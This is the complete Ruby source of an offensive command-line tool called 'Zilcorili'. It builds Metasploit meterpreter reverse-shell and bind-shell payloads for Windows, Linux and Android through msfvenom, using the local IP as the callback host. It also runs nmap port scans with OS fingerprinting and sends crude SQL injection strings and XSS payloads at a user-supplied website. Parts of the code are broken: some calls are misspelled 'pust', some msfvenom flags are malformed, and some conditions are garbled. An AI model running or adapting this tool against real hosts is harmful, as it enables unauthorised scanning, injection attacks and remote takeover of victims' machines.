require "colorize"
require "open-uri"
require 'net/http'
require "socket"
require "nmap/program"
def banner
  puts '    _______ _                _ _ _   '.light_red
  puts '   |___  (_) |              (_) (_)  '.light_yellow
  puts '      / / _| | ___ ___  _ __ _| |_   '.light_red
  puts '     / / | | |/ __/ _ \|  __| | | |  '.light_yellow
  puts "   ./ /__| | | (_| (_) | |  | | | |  ".light_red
  puts '   \_____/_|_|\___\___/|_|  |_|_|_|  '.light_yellow
  puts "\n\n"
end



class PayloadCreate
  def menu_payloads
    local_ip = UDPSocket.open {|s| s.connect("1.1.1.1", 1); s.addr.last}
    platform = {
      "windows" => "Windows",
      'linux'   => "Linux",
      'android' => "Android"
    }
    reverse_tcp = {
      "windows" => "windows/meterpreter/reverse_tcp",
      "linux64" => "linux/x64/meterpreter/reverse_tcp",
      "linux86" => "linux/x86/meterpreter/bind_tcp",
      "android" => "android/meterpreter/reverse_tcp"
    }
    bind_tcp = {
      "windows" => "windows/meterpreter_bind_tcp",
      'linux64' => "linux/x64/meterpreter/bind_tcp",
      "linux86" => "linux/x86/meterpreter/bind_tcp",
      "android" => "linux/armle/meterpreter/bind_tcp"
    }
    reverse_http = {
      "windows" => "windows/meterpreter/reverse_http",
      "linux64" => "linux/x64/meterpreter_reverse_http",
      "linux86" => "linux/x86/meterpreter_reverse_http",
      "android" => "android/meterpreter_reverse_http"
    }
    reverse_https = {
      "windows" => "windows/meterpreter/reverse_https",
      "linux64" => "linux/x64/meterpreter_reverse_https",
      "linux86" => "linux/x86/meterpreter_reverse_https",
      "android" => "android/meterpreter_reverse_https"
    }
    system('clear')
    banner
    puts "Create payload menu".light_green
    puts "Enter pyaload:"
    puts """

    [1] Reverse TCP
    [2] Bind TCP
    [3] Reverse HTTP
    [4] Reverse HTTPS
    """.green

    print "Zilcorili->Create_Payload->"
    pay_num = gets.chomp
    puts "Enter OS:"
    puts """
    [1] Windows
    [2] Linux
    [3] Android
    """.green
    print "Zilcorili->Create_Payload->Os->"
    os_pay = gets.chomp
    if os_pay.to_i == 2 || pay_num.to_i == 3 and os_pay.to_i == 2  || pay_num.to_i == 4 and os_pay.to_i == 2 || pay_num.to_i == 4 and os_pay.to_i == 1
      puts "[1] x86"
      puts "[2] x64"
      print ">>>".light_green
      ar = gets.chomp
    end
    puts "| Options payload |".light_green
    puts "| Your local ip   | #{local_ip} ".light_green
    puts "| Port payload    | 4444" .light_green
    puts 
    if pay_num.to_i == 1 and os_pay.to_i == 1
      puts "Create windows payload".light_green
      payload = "msfvenom -p --platform"+platform['windows']+" -p "+reverse_tcp['windows']+" LHOST=#{local_ip.chomp} LPORT=4444 R > payload/build.exe"
      system(payload)
    elsif pay_num.to_i == 1 and os_pay.to_i == 2 and ar.to_i == 1
      puts "Create payload reverse_tcp for linux  x86".light_green
      payload = "msfvenom --platform "+platform['linux']+" -p "+reverse_tcp["linux86"]+" LHOST=#{local_ip.chomp} LPORT=4444 -f elf  R > payload/build.elf"
      system(payload)
    elsif pay_num.to_i == 1 and os_pay.to_i == 2 and ar.to_i == 2
      puts "Create payload reverse_tcp for linux x64".light_green
      payload = "msfvenom --platform "+platform['linux']+" -p "+reverse_tcp["linux64"]+" LHOST=#{local_ip.chomp} LPORT=4444 -f elf  R > payload/build.elf"
      system(payload)
    elsif pay_num.to_i == 1 and os_pay.to_i == 3
      puts " Create payload reverse_tcp for android".light_green
      payload = "msfvenom --platform "+platform['android']+" -p "+reverse_tcp["android"]+" LHOST=#{local_ip.chomp} LPORT=4444  R > payload/build.apk"
      system(payload)
    elsif pay_num.to_i == 2 and os_pay.to_i == 1
      puts "Create payload bind_tcp | windows".light_green
      payload = "msfvenom --platform "+platform['windows']+" -p "+bind_tcp['windows']+" LHOST=#{local_ip.chomp} LPORT=4444  R > payload/build.exe"
      system(payload)
    elsif pay_num.to_i == 2 and os_pay.to_i == 2 and ar.to_i == 1
      puts "Create payload bind_tcp linux x86"
      payload = "msfvenom --platform "+platform['linux']+" -p "+bind_tcp['linux86']+" LHOST=#{local_ip.chomp} LPORT=4444 -f elf R > payload/build.elf"
      system(payload)
    elsif pay_num.to_i == 2 and os_pay.to_i == 2 and ar.to_i == 2
      puts "Create payload bind_tcp linux x64"
      payload = "msfvenom --platform "+platform['linux']+" -p "+bind_tcp["linux64"]+" LHOST=#{local_ip.chomp} LPORT=4444 -f elf  R > payload/build.elf"
      system(payload)
    elsif pay_num.to_i == 2 and os_pay.to_i == 3
      puts "Create payload bind_tcp android"
      payload = "msfvenom -p "+bind_tcp["android"]+" LHOST=#{local_ip.chomp} LPORT=4444 R > payload/build.apk"
      system(payload)
    elsif pay_num.to_i == 3 and os_pay.to_i == 1
      puts "Create payload reverse_http windows"
      if ar.to_i == 1
        payload = "msfvenom -a x86 --platform "+platform['windows']+" -p "+reverse_http["windows"]+" LHOST=#{local_ip.chomp} LPORT=4444  R > payload/build.exe"
      elsif ar.to_i == 2
        payload = "msfvenom -a x64 --platform "+platform['windows']+" -p "+reverse_http["windows"]+" LHOST=#{local_ip.chomp} LPORT=4444  R > payload/build.exe"
      else
        print "Error".light_red
        exit
      end
      system(payload)
    elsif pay_num.to_i == 3 and os_pay.to_i == 2 and ar.to_i == 1
      puts "Create payload reverse_http linux x86"
      payload = "msfvenom --platform "+platform['linux']+" -p "+reverse_http["linux86"]+" LHOST=#{local_ip.chomp} LPORT=4444 -f elf R > payload/build.elf"
      system(payload)
    elsif pay_num.to_i == 3 and os_pay.to_i == 2 and ar.to_i == 2
      pust "Create payload reverse_http linux x64"
      payload = "msfvenom --platform "+platform['linux']+" -p "+reverse_http["linux64"]+" LHOST=#{local_ip.chomp} LPORT=4444 -f elf R > payload/build.elf"
      system(payload)
    elsif pay_num.to_i == 3 and os_pay.to_i == 3
      puts "Create payload reverse http android"
      payload = "msfvenom --platform "+platform['android']+" -p "+reverse_http["android"]+" LHOST=#{local_ip.chomp} LPORT=4444  R > payload/build.apk"
      system(payload)
     elsif pay_num.to_i == 4 and os_pay.to_i == 1
      puts "Create payload reverse_https windows"
      if ar.to_i == 1
        payload = "msfvenom -a x86 --platform "+platform['windows']+" -p "+reverse_https["windows"]+" LHOST=#{local_ip.chomp} LPORT=4444  R > payload/build.exe"
      elsif ar.to_i == 2
        payload = "msfvenom -a x64 --platform "+platform['windows']+" -p "+reverse_https["windows"]+" LHOST=#{local_ip.chomp} LPORT=4444  R > payload/build.exe"
      else
        puts "Error".light_red
        exit
      end
      system(payload)
    elsif pay_num.to_i == 4 and os_pay.to_i == 2 and ar.to_i == 1
      puts "Create payload reverse_https linux x86"
      payload = "msfvenom --platform "+platform['linux']+" -p "+reverse_https["linux86"]+" LHOST=#{local_ip.chomp} LPORT=4444 -f elf R > payload/build.elf"
      system(payload)
    elsif pay_num.to_i == 4 and os_pay.to_i == 2 and ar.to_i == 2
      pust "Create payload reverse_https linux x64"
      payload = "msfvenom --platform "+platform['linux']+" -p "+reverse_https["linux64"]+" LHOST=#{local_ip.chomp} LPORT=4444 -f elf R > payload/build.elf"
      system(payload)
    elsif pay_num.to_i == 4 and os_pay.to_i == 3
      puts "Create payload reverse https android"
      payload = "msfvenom --platform "+platform['android']+" -p "+reverse_https["android"]+" LHOST=#{local_ip.chomp} LPORT=4444  R > payload/build.apk"
      system(payload)
    else
      print 'Fatal errror'.red
      exit
    end
  end
end
class ScanPort

  def all_port_scan(target_host)
    ports = (1..10000).to_a
    banner 
    puts "Start scan all port".light_green
    Nmap::Program.scan do |nmap|
      nmap.syn_scan = false
      nmap.service_scan = true
      nmap.os_fingerprint = true
      nmap.xml = "scan_port.xml"
      nmap.verbose = false
      nmap.ports = ports #[20,21,22,23,25,80,110,443,512,522,8080,1080]
      nmap.targets = target_host
    end
  end

  def default_port_scan(target_host)
    banner 
    puts "Start scan default port".light_green
    ports = [20,21,22,23,25,80,110,443,512,522,8080,1080]
    ports.each do |defaulf_port|
      puts "Check port #{defaulf_port.to_s}"
    end
    Nmap::Program.scan do |nmap|
      nmap.syn_scan = true
      nmap.service_scan = true
      nmap.os_fingerprint = true
      nmap.xml = "scan_port.xml"
      nmap.verbose = true
      nmap.ports = ports
      nmap.targets = target_host
    end
  end
  
  def menu_port
    system('clear')
    isRoot = Process.uid.zero?
    banner
    if isRoot == false
      puts "Start this script root".red
      exit
    end
    puts 
    puts '[{Scan ports}]'.center(20).light_blue
    print 'Enter target host:'
    host = gets.chomp
    puts "1) Scan all port"
    puts "2) Scan default port"
    print "Zilcorili->PortScaner->"
    mode_scan = gets.chomp
    if mode_scan == ""
      puts "Error value".red  
      exit
    elsif mode_scan.to_i == 1
      all_port_scan(host)
    elsif mode_scan.to_i == 2
      default_port_scan(host)
    end
  end
end


class ScanSiteMenu
  
  def initialize(xxs_vuln,sql_vuln)
    @xxs_vuln = xxs_vuln
    @sql_vuln = sql_vuln 
  end

  def statistics_vuln(target_site)
    banner
    puts "#".light_red*25
    puts
    puts "Report vuln site ->#{target_site}".green
    if @sql_vuln == true
      puts "[++] Sql vuln | + |".light_green
    elsif 
      puts "[--] Sql vuln | - |".green
    end
    if @xxs_vuln == true
      puts "[++] XXS vuln | + |".light_green
    elsif @xxs_vuln == false
      puts "[--] XXS vuln | - |".green
    end
    puts "Start port scaner? Y/n"
    y = gets.chomp
    if y.downcase == 'y'
      scan_port_start = ScanPort.new
      scan_port_start.menu_port
    else 
      exit
    end
  end 

  def xxs_scan(xxs_site)
    banner
    puts "[+] Start scan xxs site #{xxs_site}".light_green
    xxs_file = open('xxs.txt','r')
    for xxs in xxs_file
      pay_xxs = xxs_site+xxs.chomp
      begin
        html = open(pay_xxs)
        text = html.read
        if text.include? xxs.chomp.to_s
          puts "#".light_yellow*25
          puts
          puts "[++] Site have XXS vuln".light_green
          puts "[++] Payload #{pay_xxs}".light_green
          puts
          puts "#".light_yellow*25
          @xxs_vuln = true
          break
        else
          puts "[XXS] Payload #{pay_xxs} not work".green
        end
      rescue
        puts "[--] Site dont have xxs vuln"
        break
      end
    end
    statistics_vuln(xxs_site)
    #exit
  end

  def Scan_Main(host)
    sql = {
      '1' => "'/ ",
      '2' => "or 1==1",
      '3' => "select or 1==1",
      '4' => 'and id=-2',
      '5' => 'and or 1==/1',
      '6' => "=1'",
      '7' => "and SELECT *",
      '8' => '-/'
    }
    t = 1
    if host.include? "?"
      puts "[+] Site have GET request in database".light_green
    end
    if host.include? "?id="
      puts "[+] Site have param id=".light_green
    else
      puts "[-] Site not have param id=".green
    end

    while t < 9
      if @sql_vuln == true
        break
      end
      pay = "#{host} #{sql[t.to_s]}"
      puts "#".light_yellow*25
      begin
        html = open(pay.to_s)
        text = html.read
      rescue
        puts "#".red*25
        puts 
        puts "[SQL] This site not have Sql vuln".red
        puts
        puts "#".red*25
        xxs_scan(host)
        exit
      end
      sqlerror = ['Query failed',
        'SQL syntax error',
        'Query failed',
        'Unknown error',
        'MySQL fetch',
        'Syntax error'
      ]
      sqlerror.each do |sql_error|
        if text.include? sql_error.to_s
          @sql_vuln = true
          puts "#".light_yellow*25
          puts
          puts "[+] Found SQL error".green
          puts "Payload: #{pay.to_s}".red
          puts
          puts  "#".light_yellow*25
          break
        else
          puts "[-] Payload #{t}/8 not inject".red
        end
      end
      t+=1
    end
    if @sql_vuln == false
      puts
      puts "[-] Check 8 payloads"
      puts "[-] Site #{host} dont have sql vuln".red.red
      xxs_scan(host)
    elsif @sql_vuln == true
      xxs_scan(host)
    end
  end


  def Scan_Menu
    system('clear')
    banner
    puts "Enter target site".green
    print "Zilcorili>ScanSite>Site->".light_green
    site = gets.chomp
    if site.include? "http://"
      puts "Target site => #{site}".red
    elsif site.include? "https://"
      puts "Target site => #{site}".red
    else
      site = "http://"+site
      puts "Target site => #{site}".red
    end
    puts "[+] Start scan".green
    Scan_Main(site)
  end
end



class Main_menu
  def menu
    system('clear')
    banner
    puts "[1] Scan site Sql and Xss".light_green
    puts "[2] Create payload".light_green
    puts "[3] ??".light_green
    puts "[4] Scan ports".light_green
    puts "[5] Exit".light_green
    print "Zilcorili>>>".light_blue
    menu_1 = gets.chomp
    if menu_1.to_i == 1

      scan_start = ScanSiteMenu.new(false,false)
      scan_start.Scan_Menu

    elsif menu_1.to_i == 2
      create_pay_start = PayloadCreate.new
      create_pay_start.menu_payloads
    elsif menu_1.to_i == 3
      puts "??"
    elsif menu_1.to_i == 4
      scan_port_start = ScanPort.new
      scan_port_start.menu_port
    elsif menu_1.to_i == 5
      exit
    else
      puts "Value invalid"
    end
  end
end
m = Main_menu.new
m.menu
